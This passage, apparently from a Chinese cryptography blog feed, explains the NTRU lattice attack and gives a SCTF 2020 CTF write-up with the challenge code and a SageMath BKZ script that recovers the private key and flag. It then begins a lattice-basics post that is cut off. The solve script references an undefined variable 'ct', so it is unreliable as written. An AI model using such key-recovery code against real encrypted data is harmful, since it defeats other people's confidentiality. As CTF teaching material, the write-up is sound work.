但是直接对多项式矩阵进行规约应该是不太可能的，那么需要找到一种方法来将多项式矩阵转换为一般的矩阵，先前提到对于两个卷积多项式环<span class="math inline">\(R\)</span>上的多项式<span class="math inline">\(a(x),b(x)\)</span>，其乘积定义为： <span class="math display">\[a(x)\star b(x)=c(x),\quad c_k=\sum_{i+j\equiv k\pmod{N}}{a_{i}b_{j}}\]</span> 显然有： <span class="math display">\[c_k=(a_0,a_1,\cdots,a_{N-1})\cdot(b_{k\mod{N}},b_{k-1\mod{N}},\cdots,b_{k-N+1\mod{N}})^T\]</span> 那么可以得到： <span class="math display">\[(c_0,c_1,\cdots, c_{N-1})=(a_0,a_1,\cdots,a_{N-1})\left(\begin{matrix}b_0&amp;b_1&amp;\cdots&amp;b_{N-1}\\b_{N-1}&amp;b_0&amp;\cdots&amp;b_{N-2}\\\vdots&amp;\vdots&amp;&amp;\vdots\\b_{1}&amp;b_{2}&amp;\cdots&amp;b_{0}\end{matrix}\right)\]</span> 实际上等式右边的矩阵是<span class="math inline">\(b(x)\)</span>的系数的循环排列，这样我们就可以将矩阵内的<span class="math inline">\(h(x)\)</span>转换为一个<span class="math inline">\(n\times n\)</span>的矩阵： <span class="math display">\[H=\left(\begin{matrix}h_0&amp;h_1&amp;\cdots&amp;h_{N-1}\\h_{N-1}&amp;h_0&amp;\cdots&amp;h_{N-2}\\\vdots&amp;\vdots&amp;&amp;\vdots\\h_{1}&amp;h_{2}&amp;\cdots&amp;h_{0}\end{matrix}\right)\]</span> 同理，由于<span class="math inline">\(1\)</span>以及<span class="math inline">\(q\)</span>也可以看作是仅有常数项不为<span class="math inline">\(0\)</span>的多项式，所以可以将它们分别转换为单位矩阵<span class="math inline">\(I\)</span>以及<span class="math inline">\(q\)</span>倍的单位矩阵<span class="math inline">\(qI\)</span>，而行向量内的多项式<span class="math inline">\(f(x)\)</span>可以转换为其对应的系数向量<span class="math inline">\(\pmb{f}=(f_0,f_1,\cdots,f_{N-1})\)</span>，同理<span class="math inline">\(u(x),g(x)\)</span>也可以转换为对应的系数向量<span class="math inline">\(\pmb{u}\)</span>以及<span class="math inline">\(\pmb{g}\)</span>，那么我们就可以得到方程<span class="math inline">\((1)\)</span>的等价表示： <span class="math display">\[(\pmb{f},-\pmb{u})\left(\begin{matrix}I&amp;H\\0&amp;qI\end{matrix}\right)=(\pmb{f},\pmb{g})\]</span> 其中<span class="math inline">\(2N\times2N\)</span>矩阵<span class="math inline">\(\left(\begin{matrix}I&amp;H\\0&amp;qI\end{matrix}\right)\)</span>所确定的格被称为NTRU格（NTRU Lattice）一般记为<span class="math inline">\(\mathcal{L}_h^{\text{NTRU}}\)</span>，方便起见，后续将其记作<span class="math inline">\(\mathcal{L}_h\)</span>，显然向量<span class="math inline">\((\pmb{f},\pmb{g})\in\mathcal{L}_h\)</span>，接下来分析通过对<span class="math inline">\(\mathcal{L}_h\)</span>进行格基规约得到向量<span class="math inline">\((\pmb{f},\pmb{g})\)</span>的可能性： 因为<span class="math inline">\(\det(\mathcal{L}_h)=q^N\)</span>，所以有： <span class="math display">\[\left(\frac{2}{\sqrt{4\delta-1}}\right)^{2N-1}\sqrt{2N}\cdot|\det(\mathcal{L}_h)|^{1/2N}=\left(\frac{2}{\sqrt{4\delta-1}}\right)^{2N-1}\sqrt{2Nq}\]</span> 取<span class="math inline">\(\delta=\frac{3}{4}\)</span>，有： <span class="math display">\[\left(\frac{2}{\sqrt{4\delta-1}}\right)^{2N-1}\sqrt{2Nq}=(\sqrt{2})^{2N-1}\cdot\sqrt{2Nq}=2^N\sqrt{Nq}\]</span> 而因为<span class="math inline">\(f(x),g(x)\)</span>都是三元多项式，所以： <span class="math display">\[||(\pmb{f},\pmb{g})||=\sqrt{4d+1}\le2^N\sqrt{Nq}=\left(\frac{2}{\sqrt{4\delta-1}}\right)^{2N-1}\sqrt{2N}\cdot|\det(\mathcal{L}_h)|^{1/2N}\]</span> 很显然，<span class="math inline">\((\pmb{f},\pmb{g})\)</span>可以通过BKZ算法对格<span class="math inline">\(\mathcal{L}_h\)</span>进行格基规约得到（LLL有时候不行），通过如下代码就可以构造出格并进行规约： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = matrix(ZZ, <span class="number">2</span>*N, <span class="number">2</span>*N)</span><br><span class="line"></span><br><span class="line">h_coeff = [ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(h)] <span class="comment"># 有时候可能h要乘上一个pow(q, -1, p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    L[i, i] = <span class="number">1</span></span><br><span class="line">    L[N + i, N + i] = q</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        L[i, N + j] = h_coeff[(j - i) % N]</span><br><span class="line"></span><br><span class="line">res = L.BKZ()</span><br></pre></td></tr></table></figure> 但是目标向量并不一定在第一条，所以需要遍历每一行，判断前<span class="math inline">\(N\)</span>个分量表示的多项式是否属于<span class="math inline">\(\mathcal{T}(d+1, d)\)</span>再尝试求解，经过测试发现，一个公钥可以通过格攻击获取多个私钥，并且这些私钥都可以成功进行解密，例如对于前面的例子，假设我们只知道公钥： <span class="math display">\[h(x)=20 x^{6} + 40 x^{5} + 2 x^{4} + 38 x^{3} + 8 x^{2} + 26 x + 30\]</span> 以及密文： <span class="math display">\[e(x)=31 x^{6} + 19 x^{5} + 4 x^{4} + 2 x^{3} + 40 x^{2} + 3 x + 25\]</span> 可以通过构造格进行私钥的恢复： <span class="math display">\[\mathcal{L}_h=\left(\begin{array}{rrrrrrrrrrrrrr} 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 30 &amp; 26 &amp; 8 &amp; 38 &amp; 2 &amp; 40 &amp; 20 \\ 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 20 &amp; 30 &amp; 26 &amp; 8 &amp; 38 &amp; 2 &amp; 40 \\ 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 40 &amp; 20 &amp; 30 &amp; 26 &amp; 8 &amp; 38 &amp; 2 \\ 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 2 &amp; 40 &amp; 20 &amp; 30 &amp; 26 &amp; 8 &amp; 38 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 38 &amp; 2 &amp; 40 &amp; 20 &amp; 30 &amp; 26 &amp; 8 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 8 &amp; 38 &amp; 2 &amp; 40 &amp; 20 &amp; 30 &amp; 26 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 26 &amp; 8 &amp; 38 &amp; 2 &amp; 40 &amp; 20 &amp; 30 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 &amp; 0 \\ 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 41 \end{array}\right)\]</span> 恢复私钥并解密的代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = matrix(ZZ, <span class="number">2</span>*N, <span class="number">2</span>*N)</span><br><span class="line"></span><br><span class="line">h_coeff = [ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(h)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    L[i, i] = <span class="number">1</span></span><br><span class="line">    L[N + i, N + i] = q</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        L[i, N + j] = h_coeff[(j - i) % N]</span><br><span class="line"></span><br><span class="line">res = L.BKZ()[<span class="number">1</span>]</span><br><span class="line">ff = R([ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> res[:N]])</span><br><span class="line"><span class="built_in">print</span>(ff)</span><br><span class="line"></span><br><span class="line">fp = inv(Rp, ff)</span><br><span class="line">a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(ff * e)))</span><br><span class="line">b = center_lift(Rp, R, Rp(<span class="built_in">list</span>(fp * a)))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure> 得到多项式<span class="math inline">\(f&#39;=-x^{6} - x^{5} + x^{3} - x^{2} + 1\)</span>，显然其不等于前面的私钥<span class="math inline">\(f=x^6−x^4+x^3+x^2−1\)</span>，但是计算出来的<span class="math inline">\(b=-x^{5} + x^{3} + x^{2} - x + 1\)</span>却等于前面选择的明文.</p><h3 id="例题sctf-2020lattice">例题：[SCTF 2020]Lattice</h3><p>题目地址：<a href="https://www.nssctf.cn/problem/1399">SCTF 2020：Lattice</a> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b16encode  </span><br><span class="line">  </span><br><span class="line">Zx.&lt;x&gt; = ZZ[]  </span><br><span class="line">n = <span class="number">109</span>   </span><br><span class="line">q = <span class="number">2048</span>  </span><br><span class="line">p = <span class="number">3</span>  </span><br><span class="line">Df = <span class="number">9</span>  </span><br><span class="line">Dg = <span class="number">10</span>  </span><br><span class="line">Dr = <span class="number">11</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">f,g</span>):  </span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^n-<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bal_mod</span>(<span class="params">f,q</span>):  </span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))  </span><br><span class="line">    <span class="keyword">return</span> Zx(g)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_poly</span>(<span class="params">d</span>):  </span><br><span class="line">    <span class="keyword">assert</span> d &lt;= n  </span><br><span class="line">    result = n*[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            r = randrange(n)  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span>  </span><br><span class="line">        result[r] = <span class="number">1</span>-<span class="number">2</span>*randrange(<span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> Zx(result)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mod_prime</span>(<span class="params">f,p</span>):  </span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mod_powerof2</span>(<span class="params">f,q</span>):  </span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)  </span><br><span class="line">    g = inv_mod_prime(f,<span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        r = bal_mod(mul(g,f),q)  </span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g  </span><br><span class="line">        g = bal_mod(mul(g,<span class="number">2</span> - r),q)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():  </span><br><span class="line">    f = random_poly(Df)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            fp = inv_mod_prime(f,p)  </span><br><span class="line">            fq = inv_mod_powerof2(f,q)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            f = random_poly(Df)  </span><br><span class="line">    g = random_poly(Dg)  </span><br><span class="line">    h = bal_mod(p * mul(fq,g),q)  </span><br><span class="line">    pub_key = h  </span><br><span class="line">    pri_key = [f,fp]  </span><br><span class="line">    <span class="keyword">return</span> pub_key,pri_key  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,h</span>):  </span><br><span class="line">    r = random_poly(Dr)  </span><br><span class="line">    e = bal_mod(mul(h,r) + m,q)  </span><br><span class="line">    <span class="keyword">return</span> e  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    pub_key,pri_key = keygen()  </span><br><span class="line">    flag=<span class="string">b&#x27;SCTF&#123;***********&#125;&#x27;</span>[<span class="number">5</span>:-<span class="number">1</span>]  </span><br><span class="line">    m = Zx(<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(b16encode(flag), <span class="number">16</span>))[<span class="number">2</span>:]))  </span><br><span class="line">    <span class="built_in">print</span>(m)  </span><br><span class="line">    e = encrypt(m,pub_key)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;pub_key=&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(pub_key)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e=&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure> 显然这是NTRU加密，题目代码将flag转换为二进制然后转化为一个多项式<span class="math inline">\(m(x)\)</span>，给出了公钥<span class="math inline">\(h(x)\)</span>以及密文<span class="math inline">\(e(x)\)</span>，要恢复出明文<span class="math inline">\(m(x)\)</span>，则需要先恢复出私钥，通过下面的代码就可以通过格攻击恢复出明文<span class="math inline">\(m(x)\)</span>，并恢复出flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">109</span></span><br><span class="line">q = <span class="number">2048</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">_R = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">R = _R.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rp = PolynomialRing(Zmod(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rp = _Rp.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rq = PolynomialRing(Zmod(q), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rq = _Rq.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center_lift</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    l = [ZZ(x) <span class="keyword">if</span> x &lt;= modulo // <span class="number">2</span> <span class="keyword">else</span> ZZ(x) - modulo <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(f)]</span><br><span class="line">    <span class="keyword">return</span> R(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">Rm, f</span>):</span><br><span class="line">    <span class="keyword">return</span> Rm(f).inverse()</span><br><span class="line"></span><br><span class="line">h = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">e = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, <span class="number">2</span>*N, <span class="number">2</span>*N)</span><br><span class="line"></span><br><span class="line">h_coeff = [ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(h)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    L[i, i] = <span class="number">1</span></span><br><span class="line">    L[N + i, N + i] = q</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        L[i, N + j] = h_coeff[(j - i) % N]</span><br><span class="line"></span><br><span class="line">res = L.BKZ(blocksize=<span class="number">24</span>)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> res:</span><br><span class="line">    fc = <span class="built_in">list</span>(v[:N])</span><br><span class="line">    c0, c1, c_1 = fc.count(<span class="number">0</span>), fc.count(<span class="number">1</span>), fc.count(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> c0 == <span class="number">100</span> <span class="keyword">and</span> c1 + c_1 == <span class="number">9</span>:</span><br><span class="line">        f = R(fc)</span><br><span class="line">        Fp = inv(Rp, f)</span><br><span class="line">        a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(f * e)))</span><br><span class="line">        b = center_lift(Rp, R, Rp(<span class="built_in">list</span>(Fp * a)))</span><br><span class="line">        s = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ct])</span><br><span class="line">        pad = <span class="number">8</span> - <span class="built_in">len</span>(s) % <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pad + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span> * i + s + <span class="string">&#x27;0&#x27;</span> * (pad - i), <span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> 可以得到flag：<code>SCTF&#123;@#26f35b89d3#@&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格密码</title>
      <link href="/2025/03/31/%E6%A0%BC%E5%AF%86%E7%A0%81/"/>
      <url>/2025/03/31/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：</p><ol type="1"><li><p><a href="https://eprint.iacr.org/2023/032.pdf">A Gentle Tutorial for Lattice-Based Cryptanalysis</a></p></li><li><p><a href="https://link.springer.com/article/10.1007/BF01201999">Improved low-density subset sum algorithms</a></p></li><li><p><a href="https://link.springer.com/article/10.1007/s11424-015-3324-9">Solving low-density multiple subset sum problems with SVP oracle</a></p></li><li><p><a href="https://link.springer.com/chapter/10.1007/978-3-540-74462-7_9">Extended Hidden Number Problem and Its Cryptanalytic Applications</a></p></li><li><p><a href="https://link.springer.com/chapter/10.1007/3-540-46701-7_14">Extending Wiener’s Attack in the Presence of Many Decrypting Exponents</a></p></li></ol></blockquote><h2 id="格lattice">格（Lattice）</h2><h3 id="格的概念">格的概念</h3><p><strong>定义</strong>：一个<span class="math inline">\(n\)</span>维的格<span class="math inline">\(\mathcal{L}\)</span>是<span class="math inline">\(\mathbb{R}^{n}\)</span>的一个离散可加的子群. 对于格<span class="math inline">\(\mathcal{L}\)</span>，其可以被表示为由<span class="math inline">\(\mathbb{R}^{n}\)</span>上<span class="math inline">\(m\)</span>个线性无关的基向量<span class="math inline">\(\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_m\}\)</span>组成的基<span class="math inline">\(\pmb{B}\)</span>，向量的个数<span class="math inline">\(m\)</span>被称为格<span class="math inline">\(\mathcal{L}\)</span>的秩，所以格<span class="math inline">\(\mathcal{L}\)</span>也能表示为： <span class="math display">\[\mathcal{L}=\mathcal{L}(\pmb{B})=\left\{\sum_{i=1}^{m}a_i\pmb{b}_i|a_i\in\mathbb{Z},i=1,2,\cdots,m\right\}\]</span> 格的很多性质与记号与线性空间（向量空间）类似。 <strong>逐次最小长度</strong>：对于一个秩维<span class="math inline">\(n\)</span>的格<span class="math inline">\(\mathcal{L}\)</span>，对于<span class="math inline">\(i\in\{1,2,\cdots n\}\)</span>，若<span class="math inline">\(r\)</span>是使得格<span class="math inline">\(\mathcal{L}\)</span>拥有<span class="math inline">\(i\)</span>个长度最大为<span class="math inline">\(r\)</span>且线性无关的向量的最小值，则称<span class="math inline">\(r\)</span>为格<span class="math inline">\(\mathcal{L}\)</span>的第<span class="math inline">\(i\)</span>逐次最小长度，记为<span class="math inline">\(\lambda_i(\mathcal{L})=r\)</span> 关于逐次最小长度，我们有闵可夫斯基（Minkowski）第一定理： <strong>闵可夫斯基（Minkowski）第一定理</strong>：设<span class="math inline">\(\mathcal{L}\)</span>是一个<span class="math inline">\(n\)</span>维满秩格，则： <span class="math display">\[\lambda_1(\mathcal{L})\le\sqrt{n}|\det(\mathcal{L})|^{1/n}\]</span> 闵可夫斯基第一定理表明我们可以以<span class="math inline">\(\lambda_1(\mathcal{L})\)</span>为标准来评判格中向量的长度.</p><h3 id="关于格的问题">关于格的问题</h3><p><strong>最短向量问题</strong>（Shortest Vector Problem, <span class="math inline">\(\text{SVP}\)</span>）：给定格<span class="math inline">\(\mathcal{L}\)</span>的基<span class="math inline">\(\pmb{B}\)</span>，找到格<span class="math inline">\(\mathcal{L}\)</span>上的一个非零向量<span class="math inline">\(\pmb{v}\)</span>满足<span class="math inline">\(||\pmb{v}||=\lambda_1(\mathcal{L})\)</span>. <strong>最近向量问题</strong>（Closest Vector Problem, <span class="math inline">\(\text{CVP}\)</span>）：给定格<span class="math inline">\(\mathcal{L}\)</span>的基<span class="math inline">\(\pmb{B}\)</span>以及一个目标向量<span class="math inline">\(\pmb{t}\)</span>（不一定在格<span class="math inline">\(\mathcal{L}\)</span>上），找到格<span class="math inline">\(\mathcal{L}\)</span>上的一个非零向量<span class="math inline">\(\pmb{v}\)</span>满足 <span class="math display">\[||\pmb{v}-\pmb{t}||=\min_{\pmb{w}\in\mathcal{L}}||\pmb{w}-\pmb{t}||\]</span> 上述问题均为NP-Hard问题，这些问题的宽松版本如下： <strong>近似最短向量问题</strong>（Approximate Shortest Vector Problem, <span class="math inline">\(\text{SVP}_{\gamma}\)</span>）：给定格<span class="math inline">\(\mathcal{L}\)</span>的基<span class="math inline">\(\pmb{B}\)</span>与近似因子<span class="math inline">\(\gamma\)</span>，找到格<span class="math inline">\(\mathcal{L}\)</span>上的一个非零向量<span class="math inline">\(\pmb{v}\)</span>满足<span class="math inline">\(||\pmb{v}||\le\gamma\cdot\lambda_1(\mathcal{L})\)</span>. <strong>近似最近向量问题</strong>（Approximate Closest Vector Problem, <span class="math inline">\(\text{CVP}_{\gamma}\)</span>）：给定格<span class="math inline">\(\mathcal{L}\)</span>的基<span class="math inline">\(\pmb{B}\)</span>、一个目标向量<span class="math inline">\(\pmb{t}\)</span>（不一定在格<span class="math inline">\(\mathcal{L}\)</span>上）以及一个近似因子<span class="math inline">\(\gamma\)</span>，找到格<span class="math inline">\(\mathcal{L}\)</span>上的一个非零向量<span class="math inline">\(\pmb{v}\)</span>满足 <span class="math display">\[||\pmb{v}-\pmb{t}||=\gamma\cdot\min_{\pmb{w}\in\mathcal{L}}||\pmb{w}-\pmb{t}||\]</span> 而<span class="math inline">\(\text{SVP}_{\gamma}\)</span>与<span class="math inline">\(\text{CVP}_{\gamma}\)</span>对于确定的参数均存在有效的解决方案，所以我们可以通过解决<span class="math inline">\(\text{SVP}_{\gamma}\)</span>与<span class="math inline">\(\text{CVP}_{\gamma}\)</span>来近似地解决<span class="math inline">\(\text{SVP}\)</span>与<span class="math inline">\(\text{CVP}\)</span>. 我们可以通过格基规约来解决上述两个可计算问题.</p><h3 id="格基规约">格基规约</h3><p>格基规约的目标是将一个任意一个格转化为另外一个基相同但是具有更短、更多的正交向量。由于我们要找的是“短向量”，所以格基规约可能会提供解决近似最短向量问题的方法.</p><h4 id="lll算法">LLL算法</h4><p>LLL算法是一个迭代算法，由Lenstra、Lenstra与Lovász提出. 这个迭代算法的第一步是通过施密特正交化获得基<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>的一组正交基，通过施密特正交化，我们可以将格基进行约减，对于上面的基<span class="math inline">\(\pmb{B}\)</span>，施密特正交化过程如下： <span class="math display">\[\begin{cases}\pmb{b}_i^{*}=\pmb{b}_i,&amp;i=1\\\pmb{b}_i^{*}=\pmb{b}_i-\sum_{j=1}^{i-1}\mu_{i,j}\pmb{b}_j^{*},&amp;1&lt;i\le n\end{cases}\kern{25pt}\mu_{i,j}=\frac{\langle\pmb{b}_i,\pmb{b}_{j}^{*}\rangle}{\langle\pmb{b}^{*}_{j},\pmb{b}^{*}_{j}\rangle}\]</span> 而对于<span class="math inline">\(\delta\in(\frac{1}{4},1)\)</span>，如果基<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>满足：</p><ol type="1"><li>（尺寸约减，size-reduction）对于任意<span class="math inline">\(i&gt;j\)</span>，有<span class="math inline">\(|\mu_{i,j}|\le\frac{1}{2}\)</span>；</li><li>（Lovász条件，Lovász condition）对于任意<span class="math inline">\(i\in\{1,2,\cdots,n-1\}\)</span>，有<span class="math inline">\((\delta-\mu_{i+1,i}^{2})||\pmb{b}_{i}^{*}||^{2}\le||\pmb{b}_{i+1}^{*}||^2\)</span></li></ol><p>则称基<span class="math inline">\(\pmb{B}\)</span>为<span class="math inline">\(\delta\)</span>-LLL约减基，通过结合这两个条件，Lenstra、Lenstra与Lovász给出了LLL算法： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503311318467.png" alt="Pasted image 20250203175051" /> 而对于格中最短向量的下界，我们有如下定理： 设格基<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>对应的施密特正交基为基<span class="math inline">\(\pmb{B}^*=\{\pmb{b}_1^*,\pmb{b}_2^*,\cdots,\pmb{b}_n^*\}\)</span>，则有： <span class="math display">\[\lambda_1(\mathcal{L}(\pmb{B}))\ge\min_{i\in\{1,\cdots,n\}}||\pmb{b}^{*}_{i}||\]</span> 通过这个定理，我们可以导出如下命题： 假若<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>是一个<span class="math inline">\(\delta\)</span>-LLL约减基，则必然有： <span class="math display">\[||\pmb{b}_1||\le\left(\frac{2}{\sqrt{4\delta-1}}\right)^{n-1}\sqrt{n}\cdot|\det(\mathcal{L})|^{1/n}\]</span></p><p>这条式子往往可以帮助我们判断一个格基是否能通过LLL来约减出最短向量. 在sage中内置了现成的LLL算法，例如我们要解决<a href="https://eprint.iacr.org/2023/032.pdf">A Gentle Tutorial for Lattice-Based Cryptanalysis</a>中的例3.12（如下图）： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503311317528.png" alt="Pasted image 20250203182155" /> 则可以通过下面的步骤来获得结果： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503311318138.png" alt="Pasted image 20250203182349" /> 显然可以得到结果为<span class="math inline">\(\pmb{b}_1^*=(0,-1),\pmb{b}_2^*=(-2,0)\)</span>.</p><h3 id="解决cvp">解决CVP</h3><p>LLL算法同样可以用来解决近似最近向量问题，但是需要结合Babai最近平面算法或者Kannan嵌入法</p><h4 id="babai最近平面算法babais-nearest-plane-algorithm">Babai最近平面算法（Babai’s Nearest Plane Algorithm）</h4><p>Babai最近平面算法首先要获得输入格的约减基<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>，然后对于目标向量<span class="math inline">\(\pmb{t}\)</span>，我们令<span class="math inline">\(\pmb{t}&#39;=\pmb{t}-c_n\pmb{b}_n\)</span>，其中：<span class="math inline">\(c_n=\lceil\langle\pmb{t},\pmb{b}^*_{n}\rangle/\langle\pmb{b}^*_{n},\pmb{b}^*_{n}\rangle\rfloor\)</span>（其中<span class="math inline">\(\lceil\cdot\rfloor\)</span>表示四舍五入），然后对前<span class="math inline">\(n-1\)</span>个向量与<span class="math inline">\(\pmb{t}&#39;\)</span>进行操作，得到<span class="math 